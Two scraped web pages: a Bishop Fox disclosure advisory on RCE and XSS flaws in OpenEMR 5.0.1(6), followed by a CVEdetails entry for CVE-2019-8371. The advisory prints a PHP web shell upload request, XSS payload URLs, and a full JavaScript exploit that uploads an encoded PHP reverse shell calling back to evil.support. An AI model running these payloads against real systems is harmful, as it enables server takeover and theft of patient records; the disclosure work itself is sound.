=== Content from know.bishopfox.com_d966d434_20250120_232730.html ===


Cosmos

[Services](https://bishopfox.com/services)

[Resources](https://bishopfox.com/resource-center)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

[About Us](https://bishopfox.com/company)

[Get Started](https://bishopfox.com/get-started)

![](https://assets.bishopfox.com/prod-1437/Images/gigaom-badge-2024-ASM-leader.png)

Introducing Cosmos

### Named Leader of the GigaOm Radar for the third year in a row!

[Request A Demo](https://bishopfox.com/request-demo)

[Cosmos Overview](/cosmos)

Meet Cosmos: The continuous offensive security solution designed to provide proactive defense.

[Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)

Get Cosmos Attack Surface Management (CASM) for unmatched visibility into your changing external attack surface with continuous discovery and mapping.

[Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)

Cosmos Application Penetration Testing (CAPT) strengthens the security of business-critical applications with in-depth assessments.

[Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

Cosmos External Penetration Testing (CEPT) builds on Cosmos Attack Surface Management to provide the highest level of attack surface protection with post-exploitation activities.

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/poly-fox-graphic.png)

The Best Defense is a Great Offense

### See Why We're the Leaders in Offensive Security

[Explore Services](https://bishopfox.com/services)

[Application Security](/services/application-security)

Ensure your applications are secure and improve your DevSecOps practices.

* [Application Pen Testing](/services/application-penetration-testing)
* [Hybrid App Assessment](/services/hybrid-application-assessment)
* [Mobile App Assessment](/services/mobile-application-assessment)
* [View More](/services/application-security)

[Red Team & Readiness](/services/red-teaming)

Get a holistic view of your ability to defend against a real-world attack.

* [Social Engineering](/services/social-engineering)
* [Incident Response Tabletop Exercise](/services/tabletop-exercise)
* [Ransomware Readiness](/services/ransomware-readiness)

[IoT & Product Security](/services/product-security-review)

Validate interconnected devices and products are secure against attackers.

[Cloud Security](/services/cloud-penetration-testing)

Assess cloud security posture with expert testing and analysis of your environment.

[Network Security](/services/network-security)

Get insight into how skilled adversaries could establish network access and put sensitive systems and data at risk.

* [External Pen Testing](/services/external-penetration-testing)
* [Internal Pen Testing](/services/internal-penetration-testing)

[AI/ML Security Assessment](/services/ai-ml-security-assessment)

Fortify the security of rapidly evolving AI/ML applications, models, and supporting infrastructures.

[Compliance & Regulations](/services/compliance-and-frameworks)

Satisfy governance, risk, and compliance programs with our testing services.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase security in their partner ecosystems.

* [Cloud App Security Assessments (CASA)](/services/casa)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)
* [Oracle Security Assessments](/services/oracle-security-assessment)
* [View More](/services/vendor-assessments)

![](https://assets.bishopfox.com/prod-1437/Images/pages/campaign-lander-images/2023-Ponemon-Report/Ponemon-Report-Tablet_Plus-Pages-copy.png)

A Ponemon Institute Report

### The State of Offensive Security

Get the blueprint. Insights into how mature security organizations invest in offensive strategies.

[Get the Report](https://bishopfox.com/ponemon-2023-report)

[Resource Center](/resource-center)

Discover new offensive security resources, ranging from reports and eBooks to slide decks from speaking gigs.

* [Webcasts](/resources/webcasts)
* [Reports](/resources/reports)
* [eBooks & Guides](/resources/guides)
* [Cybersecurity Style Guide](/cybersecurity-style-guide)
* [View All](/resources)

[Bulletins & Advisories](/blog/advisories)

Explore the latest security bulletins and advisories released by our team.

* [Exploit for Fortinet CVE-2022-42475](/blog/exploit-cve-2022-42475)
  Latest
* [View All](/blog/advisories)

[Blog](/blog)

Dive into our blog for insights and perspectives from our offensive security experts.

* [Industry](/blog/industry)
* [Technology](/blog/technology)
* [Product](/blog/product)

[Bishop Fox Labs](/labs)

Learn more about our research and some of the most popular open-source security tools. Check them out here!

* [Hacking Tools](/tools)
* [Training Sessions](/resources/livestream)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/Tag-Cyber-Independent-Assessment-Feature-Transparent.png)

Why Partner with Us?

### Join Forces with the Leaders in Offensive Security

Independent Assessment by TAG Cyber

[Get the Report](https://bishopfox.com/resources/tag-cybers-report-cast-platform)

[Partner Program Overview](/partners)

Learn about our partner programs and see how we can work together to provide best-in-class security offerings.

[Find a Partner](/partner-directory)

Check out our awesome ecosystem of trusted partners to find the right solution for your needs.

[Become a Partner](/partners/become-a-partner)

Explore partnership opportunities and apply to join forces with Bishop Fox.

[Assessments for Our Partners](/services/vendor-assessments)

We're proud to work with Google, Facebook, and Amazon to increase the security of their partner ecosystems.

* [Cloud Application Security Assessments](/services/casa)
* [Mobile Application Security Assessment](/services/masa)
* [Nest Assessments](/services/nest-partner-security-assessment)
* [Meta Workplace Assessments](/services/facebook-partner-assessment)
* [Amazon Alexa Assessments](/services/amazon-alexa-built-in-device-assessment)

![](https://assets.bishopfox.com/prod-1437/Images/global/main-menu/hero-fox.png)

We're Hiring!

### Want to Work with the Best Minds in Offensive Security?

Be part of an elite team and work on projects that have a real impact.

[Explore Openings](https://bishopfox.com/careers)

[Company Overview](/company)

Get to know us. Learn about our roots and see why we're on a mission to improve security for all.

[Events](/events)

Join us at an upcoming event or peruse our speaking engagements, past and present.

[Newsroom](/news)

Read the latest articles, announcements, and press releases from Bishop Fox.

[Contact Us](/contact)

Want to get in touch? We're ready to connect.

[Career Opportunities](/careers)

We're hiring! Explore our open positions and discover why the Fox Den is a great place to build your career.

[Intern & Educational Programs](/company/internships)

Starting your offensive security journey? Check out our internships and educational programs.

[Bishop Fox Mexico](/mexico)

Â¡Celebramos! Bishop Fox is now in Mexico. Learn more about our expansion.

![bishopfox-mexico-logo](/static/assets/images/main-menu/bishopfox-mexico-logo.png)

Search

Cosmos

* Overview
* [Cosmos Overview](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

[Services](https://bishopfox.com/services)

* [Overview](https://bishopfox.com/services)
* [Application Security](/services/application-security)
* [Red Team & Readiness](/services/red-teaming)
* [IoT & Product Security](/services/product-security-review)
* [Cloud Security](/services/cloud-penetration-testing)
* [Network Security](/services/network-security)
* [AI/ML Security Assessment](/services/ai-ml-security-assessment)
* [Compliance & Regulations](/services/compliance-and-frameworks)
* [Assessments for Our Partners](/services/vendor-assessments)

[Resources](https://bishopfox.com/resource-center)

* [Overview](https://bishopfox.com/resource-center)
* [Resource Center](/resource-center)
* [Bulletins & Advisories](/blog/advisories)
* [Blog](/blog)
* [Bishop Fox Labs](/labs)

[Customers](https://bishopfox.com/customers)

[Partners](https://bishopfox.com/partners)

* [Overview](https://bishopfox.com/partners)
* [Partner Program Overview](/partners)
* [Find a Partner](/partner-directory)
* [Become a Partner](/partners/become-a-partner)
* [Assessments for Our Partners](/services/vendor-assessments)

[About Us](https://bishopfox.com/company)

* [Overview](https://bishopfox.com/company)
* [Company Overview](/company)
* [Events](/events)
* [Newsroom](/news)
* [Contact Us](/contact)
* [Career Opportunities](/careers)
* [Intern & Educational Programs](/company/internships)
* [Bishop Fox Mexico](/mexico)

[Get Started](https://bishopfox.com/get-started)

Search

[Blog](https://bishopfox.com/blog)
// [Advisories](https://bishopfox.com/blog/advisories)
// [Sep 10, 2019](https://bishopfox.com/blog/openemr-5-0-16-advisory)

# OpenEMR 5.0.1(6) - RCE and XSS

By:
[Chris Davis, Senior Security Consultant](https://bishopfox.com/authors/chris-davis)

![Gauge showing high severity reading](https://assets.bishopfox.com/prod-1437/Images/channels/blog/featured-images/High-Risk-Advisory-Featured.jpg)

Share

## ADVISORY SUMMARY

OpenEMR is a widely used open source medical records management tool. The latest version at the time of this research was 5.0.1(6), older versions are believed but unconfirmed to be affected.

## Impact

The OpenEMR application is used globally to manage millions of patient records. Successful exploitation of the identified vulnerabilities would lead to server compromise and would allow an administrative attacker to execute code on the underlying server. In both situations, sensitive patient information would be at risk.

## High & MediumÂ Risk Levels

## Affected Vendor

| Product Vendor | Product Name | Affected Version |
| --- | --- | --- |
| OpenEMR | OpenEMR EHR | 5.0.1(6) |

## Vulnerabilities List:

* ARBITRARY REMOTE CODE EXECUTION
* CROSS-SITE SCRIPTING

## Solution

Update to the latest version - version 5.0.2.

## Credits

[Chris Davis](https://bishopfox.com/authors/chris-davis), Security Analyst, Bishop Fox -Â [[emailÂ protected]](/cdn-cgi/l/email-protection#33505752455a4073515a405b5c43555c4b1d505c5e)

## Timeline

1. 02/17/2019: Initial discovery
2. 02/21/2019: Contact with vendor
3. 09/10/2019: Coordinated publication

## VULNERABILITIES

## Arbitrary Remote Code Execution

The OpenEMR application is affected by one instance of remote code execution (RCE) that would allow attackers to execute arbitrary code. The vulnerability could be exploited by administrative users, leading to complete server compromise.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| [CVE-2019-8371](https://www.cvedetails.com/cve/CVE-2019-8371/) | High | Code Execution | Remote |

### Further Details

* Vulnerability: CWE-94
* CVSS Base Score: 9.1
* CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

Administrative users could modify files within the OpenEMR application web root by using the Administration File Management functionality, which allowed PHP code to be added to the files to create custom letter templates. To gain command execution on the web server a PHP web shell was uploaded, as shown below:

```
POST /openemr/interface/super/manage_site_files.php HTTP/1.1
Host: localhost
â¦omitted for brevityâ¦
-----------------------------466827610997816061597388451
Content-Disposition: form-data; name="form_filename"

letter_templates/custom_pdf.php
-----------------------------466827610997816061597388451
Content-Disposition: form-data; name="form_filedata"

<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
â¦omitted for brevityâ¦ Figure 1 - PHP Web shell upload
```

***Figure 1** - PHP Web shell upload*

Uploading a PHP web shell found at `https://github.com/artyuum/Simple-PHP-Web-Shell`Â and navigating to the affected `/openemr/sites/default/letter_templates/custom_pdf.php`Â endpoint allowed system commands to be executed on the underlying server, as shown below:

![Bishop Fox Security Advisory OpenEMR Figure 2 - PHP web shell](https://know.bishopfox.com/hubfs/07252019_Advisory_OpenEMRImage1.png)

***Figure 2***- *PHP web shell*

The commands executed on the application server from the context of the www-data user.

## Cross-Site Scripting

The OpenEMR application is affected by several instances of reflected cross-site scripting (XSS) that would allow attackers to execute arbitrary JavaScript. The vulnerability could be exploited to affect administrative users, leading to complete server compromise. The walkthrough below uses one payload to execute arbitrary code on the server. The exploit code is included in the appendix at the end of this advisory.

| CVE ID | Security Risk | Impact | Access Vector |
| --- | --- | --- | --- |
| [CVE-2019-8368](https://www.cvedetails.com/cve/CVE-2019-8368/) | Medium | Code execution | Remote |

## Further Details

* Vulnerability: CWE-79
* CVSS Base Score: 6.1
* CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

Instances of reflected cross-site scripting that led to remote code execution (RCE) were found within the OpenEMR application. Enticing an administrative user to click a malicious link would trigger the XSS. This was demonstrated at the `facility_admin.php`Â endpoint by sending the following `GET`Â request:

```
GET
/openemr/interface/usergroup/facility_admin.php?fid=xss%22%3E%3Cscript%20src=%22http://
evil.support:8000/expoit.js%22%3E%3C/script%3E HTTP/1.1/
```

***Figure 3*** -Â *JavaScript payload sent to the server*

The initial JavaScript payload executed within the OpenEMR application origin, loading and executing `exploit.js`, a JavaScript file that uploaded a PHP reverse shell and executed it, as shown below:

![OpenEMR image](https://assets.bishopfox.com/prod-1437/Documents/Data-Sheets/OpenEMR-1.png)

***Figure 4***-Â *Reverse shell connection*

An unauthenticated attacker could exploit this vulnerability to entice an administrative user to click the maliciously crafted link, which would grant server access to the attacker.

**Additional Locations:**

```
http://localhost/openemr/interface/super/rules/library/RulesPlanMappingEventHandlers_ajax.php?action=getPlanStatus&plan_id=%3cimg%20src%3da%20onerror%3dalert(1)%3e

```
```
http://localhost/openemr/interface/main/onotes/office_comments_full.php?
active=%20onmouseover%3dalert(1)%20style%3dposition%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%20xss&offset=10
```
```
http://localhost/openemr/library/dicom_frame.php?web_path=x'%3e%3cscript%3ealert(1</span><span style="font-size:16px;">)%3c%2fscript%3e
```
## Appendix A - Exploit Code

## XSS Exploit Code to Gain Remote Code Execution (RCE)

An attacker could use the following payload to obtain a reverse shell:

```
// XSS to RCE payload
// Function to retrieve CSRF Token
getCsrfToken = async () => {
    const xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", "/openemr/interface/super/manage_site_files.php", true);
    xhr.onreadystatechange = async (e) => {
        if (xhr.readyState === 4 && xhr.status === 200){
            doc = xhr.response;
            const csrfToken = doc.getElementsByName("csrf_token_form")[0].value
            uploadShell(csrfToken);
            console.log(csrfToken);
            }
    };
    xhr.send();
}

// Function to upload php reverse shell code
uploadShell = async (csrfToken) =>{
    var formdata = new FormData();
    formdata.append("form_filename", "letter_templates/custom_pdf.php");
    /*generated with msfvenom -p php/reverse_php lhost=evil.support lport=1337
    Base64 encoded to avoid issues with special charectors */
    const shell ="<?php
eval(base64_decode('ICAvKjw/cGhwIC8qKi8KICAgICAgQGVycm9yX3JlcG9ydGluZygwKTsKICAgICAgQHNldF90aW1lX2xpbWl0KDApOyBAaWdub3JlX3VzZXJfYWJvcnQoMSk7IEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDApOwogICAgICAkZGlzPUBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpOwogICAgICBpZighZW1wdHkoJGRpcykpewogICAgICAgICRkaXM9cHJlZ19yZXBsYWNlKCcvWywgXSsvJywgJywnLCAkZGlzKTsKICAgICAgICAkZGlzPWV4cGxvZGUoJywnLCAkZGlzKTsKICAgICAgICAkZGlzPWFycmF5X21hcCgndHJpbScsICRkaXMpOwogICAgICB9ZWxzZXsKICAgICAgICAkZGlzPWFycmF5KCk7CiAgICAgIH0KCiAgICAkaXBhZGRyPSdldmlsLnN1cHBvcnQnOwogICAgJHBvcnQ9MTMzNzsKCiAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdRaHdnQVlDS0MnKSl7CiAgICAgIGZ1bmN0aW9uIFFod2dBWUNLQygkYyl7CiAgICAgICAgZ2xvYmFsICRkaXM7CgogICAgICBpZiAoRkFMU0UgIT09IHN0cnBvcyhzdHJ0b2xvd2VyKFBIUF9PUyksICd3aW4nICkpIHsKICAgICAgICAkYz0kYy4iIDI+JjFcbiI7CiAgICAgIH0KICAgICAgJEVDZkJxUj0naXNfY2FsbGFibGUnOwogICAgICAkYXBJZGFTWD0naW5fYXJyYXknOwoKICAgICAgaWYoJEVDZkJxUigncGFzc3RocnUnKWFuZCEkYXBJZGFTWCgncGFzc3RocnUnLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJEVDZkJxUigncHJvY19vcGVuJylhbmQhJGFwSWRhU1goJ3Byb2Nfb3BlbicsJGRpcykpewogICAgICAgICRoYW5kbGU9cHJvY19vcGVuKCRjLGFycmF5KGFycmF5KCdwaXBlJywncicpLGFycmF5KCdwaXBlJywndycpLGFycmF5KCdwaXBlJywndycpKSwkcGlwZXMpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgd2hpbGUoIWZlb2YoJHBpcGVzWzFdKSl7CiAgICAgICAgICAkby49ZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgICAgIH0KICAgICAgICBAcHJvY19jbG9zZSgkaGFuZGxlKTsKICAgICAgfWVsc2UKICAgICAgaWYoJEVDZkJxUignZXhlYycpYW5kISRhcElkYVNYKCdleGVjJywkZGlzKSl7CiAgICAgICAgJG89YXJyYXkoKTsKICAgICAgICBleGVjKCRjLCRvKTsKICAgICAgICAkbz1qb2luKGNocigxMCksJG8pLmNocigxMCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRFQ2ZCcVIoJ3NoZWxsX2V4ZWMnKWFuZCEkYXBJZGFTWCgnc2hlbGxfZXhlYycsJGRpcykpewogICAgICAgICRvPXNoZWxsX2V4ZWMoJGMpOwogICAgICB9ZWxzZQogICAgICBpZigkRUNmQnFSKCdzeXN0ZW0nKWFuZCEkYXBJZGFTWCgnc3lzdGVtJywkZGlzKSl7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBzeXN0ZW0oJGMpOwogICAgICAgICRvPW9iX2dldF9jb250ZW50cygpOwogICAgICAgIG9iX2VuZF9jbGVhbigpOwogICAgICB9ZWxzZQogICAgICBpZigkRUNmQnFSKCdwb3BlbicpYW5kISRhcElkYVNYKCdwb3BlbicsJGRpcykpewogICAgICAgICRmcD1wb3BlbigkYywncicpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgaWYoaXNfcmVzb3VyY2UoJGZwKSl7CiAgICAgICAgICB3aGlsZSghZmVvZigkZnApKXsKICAgICAgICAgICAgJG8uPWZyZWFkKCRmcCwxMDI0KTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQHBjbG9zZSgkZnApOwogICAgICB9ZWxzZQogICAgICB7CiAgICAgICAgJG89MDsKICAgICAgfQoKICAgICAgICByZXR1cm4gJG87CiAgICAgIH0KICAgIH0KICAgICRub2Z1bmNzPSdubyBleGVjIGZ1bmN0aW9ucyc7CiAgICBpZihpc19jYWxsYWJsZSgnZnNvY2tvcGVuJylhbmQhaW5fYXJyYXkoJ2Zzb2Nrb3BlbicsJGRpcykpewogICAgICAkcz1AZnNvY2tvcGVuKCJ0Y3A6Ly9ldmlsLnN1cHBvcnQiLCRwb3J0KTsKICAgICAgd2hpbGUoJGM9ZnJlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PVFod2dBWUNLQyhzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgZndyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ3cml0ZSgkcywkb3V0KTsKICAgICAgfQogICAgICBmY2xvc2UoJHMpOwogICAgfWVsc2V7CiAgICAgICRzPUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7CiAgICAgIEBzb2NrZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKICAgICAgQHNvY2tldF93cml0ZSgkcywic29ja2V0X2NyZWF0ZSIpOwogICAgICB3aGlsZSgkYz1Ac29ja2V0X3JlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PVFod2dBWUNLQyhzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgQHNvY2tldF93cml0ZSgkcywkbm9mdW5jcyk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAc29ja2V0X3dyaXRlKCRzLCRvdXQsc3RybGVuKCRvdXQpKTsKICAgICAgfQogICAgICBAc29ja2V0X2Nsb3NlKCRzKTsKICAgIH0K\'))?>"
      // Appends shell code and needed data to the upload form
    var blob = new Blob([], {type: "application/octet-stream"});
    formdata.append("form_filedata", shell);
    formdata.append("MAX_FILE_SIZE", "12000000");
    formdata.append("form_image", blob, "")
    formdata.append("form_dest_filename", "")
    formdata.append("form_education", blob, "")
      // Appends CSRF token to the form
    formdata.append("csrf_token_form", csrfToken);
    formdata.append("bn_save", "Save");

      // Sends the Form upload
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/openemr/interface/super/manage_site_files.php", true);
    xhr.onreadystatechange = async (e) => {
        if (xhr.readyState === 4 && xhr.status === 200){
            revShellGo();
        }
    };
    xhr.send(formdata);
}
// Calls the endpoint where the shell code is stored to execute
revShellGo = async () => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "/openemr/sites/default/letter_templates/custom_pdf.php", true);
    xhr.send();
}
getCsrfToken();
```

***FIGURE 5** - Contents of exploit.js*

Subscribe to Bishop Fox's Security Blog

Be first to learn about latest tools, advisories, andÂ findings.

Thank You! You have been subscribed.

---

![Chris davis](https://assets.bishopfox.com/prod-1437/Images/headshots/chris-davis.jpg)

About the author,
Chris Davis

Senior Security Consultant

| Chris Davis is a Senior Security Consultant at Bishop Fox. His areas of expertise are application penetration testing (static and dynamic) and external network penetration testing.  Chris actively conducts independent security research and has been credited with the discovery of 40 CVEs (including CVE-2019-7551 and CVE-2018-17150) on enterprise-level, highly distributed software. The vulnerabilities he identified included remote code execution and cross-site scripting (XSS). |
| --- |

[More by Chris](https://bishopfox.com/authors/chris-davis)

### Recommended Posts

## You might be interested in these related posts.

[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Featured_Tile_2024-12-12-205929_kppy.jpg)

Dec 13, 2024

Current State of SonicWall Exposure: Firmware Decryption Unlocks New Insights](https://bishopfox.com/blog/state-sonicwall-exposure-firmware-decryption-unlocks-insights)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/SonicWall-hadware-part1_Featured_Tile.jpg)

Dec 02, 2024

Sonicwall Firmware Deep Dive - Part 1](https://bishopfox.com/blog/sonicwall-firmware-deep-dive-part-1)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Bishop-Fox-Blog-Fortijump.jpg)

Nov 01, 2024

A Brief Look at FortiJump (FortiManager CVE-2024-47575)](https://bishopfox.com/blog/a-look-at-fortijump-cve-2024-47575)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Jul 02, 2024

Traeger Grill D2 Wi-Fi Controller, Version 2.02.04](https://bishopfox.com/blog/traeger-wifi-controller-advisory)

* [Cosmos Platform](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

* [Services](/services)
* [Application Security](/services/application-security)
* [Cloud Security](/services/cloud-penetration-testing)
* [IoT & Product Security](/services/product-security-review)
* [Network Security](/services/network-security)
* [Red Team & Readiness](/services/red-teaming)
* [Compliance, Regulations, & Frameworks](/services/compliance-and-frameworks)
* [Google, Facebook, & Amazon Partner Assessments](/services/vendor-assessments)

* [Resources](/resources)
* [Resource Center](/resource-center)
* [Blog](/blog)
* [Advisories](/blog/advisories)
* [Tools](/tools)

* [Our Customers](/customers)
* [Our Customer Stories](/resources/customer-stories)

* [Partners](/partners)
* [Partner Programs](/partners)
* [Partner Directory](/partner-directory)
* [Become a Partner](/partners/become-a-partner)

* [Company](/company)
* [About Us](/company)
* [Careers
  We're Hiring](/careers)
* [Events](/events)
* [Newsroom](/news)
* [Bishop Fox Mexico](/mexico)
* [Bishop Fox Labs](/labs)
* [Contact Us](/contact)

Copyright Â© 2025 Bishop Fox

[Privacy Statement](https://bishopfox.com/privacy-statement)
[Responsible Disclosure Policy](https://bishopfox.com/vulnerability-disclosure-policy)

This site uses cookies to provide you with a great user experience. By continuing to use our website, you consent to the use of cookies. To find out more about the cookies we use, please see our [Privacy Policy](https://bishopfox.com/privacy-statement).

Accept



=== Content from www.cvedetails.com_e0896cc9_20250121_013247.html ===

[Documentation](/documentation/ "User guide and product documentation")

[Documentation](/documentation/ "User guide and product documentation")

* [Log in](/sign-in "Login")

[![](/img/ssc-logo.svg "SecurityScorecard")
CVEdetails.com](/ "Go to cvedetails.com homepage")
[powered by SecurityScorecard](https://securityscorecard.com?utm_source=cvedetails)

Vulnerabilities

[By Date](/browse-by-date.php "Browse security vulnerabilities by date")
[By Type](/vulnerabilities-by-types.php "Vulnerability distribution by type")
[Known Exploited](/cisa-known-exploited-vulnerabilities/kev-1.html "Vulnerabilities in the CISA Known Exploited Vulnerabilities (KEV) catalog")
[Assigners](/cve-assigners-cnas/1.html "CVE sources, assigners")
[CVSS Scores](/cvss-score-charts.php "CVSS score distribution report")
[EPSS Scores](/epss/epss-score-history.html?delta=110 "EPSS score change history")
[Search](/vulnerability-search.php "Vulnerability search")

Vulnerable Software

[Vendors](/vendor.php "Browse software and hardware vendors")
[Products](/product-list.php "Browse software and hardware products")
[Version Search](/version-search.php "Search for product versions")

Vulnerability Intel.

[Newsfeed](/data/list "Newsfeed, things you need to know, most recent first")
[Open Source Vulns](/osv/ecosystem/list "Vulnerabilities in open source projects and ecosystems")
[Emerging CVEs](/data/emerging-CVEs "CVEs discovered in other sources but not yet published")
[Feeds](/feed-aggregator/feed-list "RSS feed aggregator")
[Exploits](/exploit/list "Exploits from exploit-db, packetstorm and metasploit")
[Advisories](/advisory/list "Security advisories from vendors and other sources like github")
[Code Repositories](/code/repositories "Monitored open source repositories")
[Code Changes](/code/changes "Source code changes related to security issues and CVEs")

Attack Surface

[My Attack Surface](/asi/my-attack-surface "External attack surface summary for my organization")
[Digital Footprint](/asi/my-digital-footprint "Digital footprint of my organization")
[Discovered Products](/asi/discovered-products "Products discovered on my attack surface by scanners")
[Detected Vulns](/asi/detected-vulns "Vulnerabilities detected on my attack surface by scanners")
[IP Search](/asi/ip-details "Search for an IP address")

Other

[Metasploit Modules](/metasploit-modules/1.html "Metasploit modules and related CVEs")
[CWE Definitions](/cwe-definitions/ "CWE definitions")
[CAPEC Definitions](/capec-definitions/ "CAPEC definitions")
[Articles](https://securityscorecard.com/research/?utm_source=cvedetails "Featured research articles from SecurityScorecard")
[Blog](https://securityscorecard.com/blog/?utm_source=cvedetails "SecurityScorecard blog")

# Vulnerability Details : [CVE-2019-8371](/cve/CVE-2019-8371/ "CVE-2019-8371 security vulnerability details")

OpenEMR v5.0.1-6 allows code execution.

Published
2019-09-16 17:15:14
Updated
2021-07-21 11:39:24
Source
[MITRE](/vulnerability-list/assigner-1/MITRE.html "CVEs created by MITRE")

View at

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-8371 "Vulnerability details at NVD"),

[CVE.org](https://www.cve.org/CVERecord?id=CVE-2019-8371 "Vulnerability details at CVE project")

## Products affected by CVE-2019-8371

* [Open-emr](/vendor/12269/Open-emr.html "Details for Open-emr") Â» [Openemr](/version-list/12269/23156/1/Open-emr-Openemr.html "Open-emr Openemr versions list") Â» Version: 5.0.1-6 cpe:2.3:a:open-emr:openemr:5.0.1-6:\*:\*:\*:\*:\*:\*:\* [Matching versions](/version-search.php?cpeMatchCriteriaId=7f745b18-61fe-48ff-a00c-8063e5751754 "Matching product versions")

## Exploit prediction scoring system (EPSS) score for CVE-2019-8371

[EPSS FAQ](/epss/faq.html "Exploit Prediction Scoring System (EPSS) FAQ")

0.67%
Probability of exploitation activity in the next 30 days
[EPSS Score History](/epss/CVE-2019-8371/epss-score-history.html "Exploit Prediction Scoring System (EPSS) score history for CVE-2019-8371")

~ 80 %

Percentile, the proportion of vulnerabilities that are scored at or less

## CVSS scores for CVE-2019-8371

| Base Score | Base Severity | CVSS Vector | Exploitability Score | Impact Score | Score Source | First Seen |
| --- | --- | --- | --- | --- | --- | --- |
| 9.0 | HIGH | AV:N/AC:L/Au:S/C:C/I:C/A:C | 8.0 | 10.0 | NIST |  |
| Access Vector: NetworkAccess Complexity: LowAuthentication: SingleConfidentiality Impact: CompleteIntegrity Impact: CompleteAvailability Impact: Complete | | | | | | |
| 7.2 | HIGH | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H | 1.2 | 5.9 | NIST |  |
| Attack Vector: NetworkAttack Complexity: LowPrivileges Required: HighUser Interaction: NoneScope: UnchangedConfidentiality: HighIntegrity: HighAvailability: High | | | | | | |

## CWE ids for CVE-2019-8371

* [CWE-434 Unrestricted Upload of File with Dangerous Type](/cwe-details/434/Unrestricted-Upload-of-File-with-Dangerous-Type.html "CWE-434 - CWE definition")

  The product allows the upload or transfer of dangerous file types that are automatically processed within its environment.
  Assigned by:
  nvd@nist.gov (Primary)

## References for CVE-2019-8371

* [https://know.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting](https://know.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting "Open reference url in new window - External link")
  OpenEMR 5.0.1(6) - RCE and XSS Exploit;Third Party Advisory
  [CVEs referencing this url](/reference-url-info/-gOanywrQAMOINFF-Skn4znjOCc.html "CVEs referencing this url")

Jump to
CVE Summary
Affected Products
EPSS Score
CVSS Scores
CWEs
References

[About](/about-contact.php "About cvedetails.com")
[Terms of Use](/terms-and-conditions.php)
[Privacy Policy](/privacy.php)
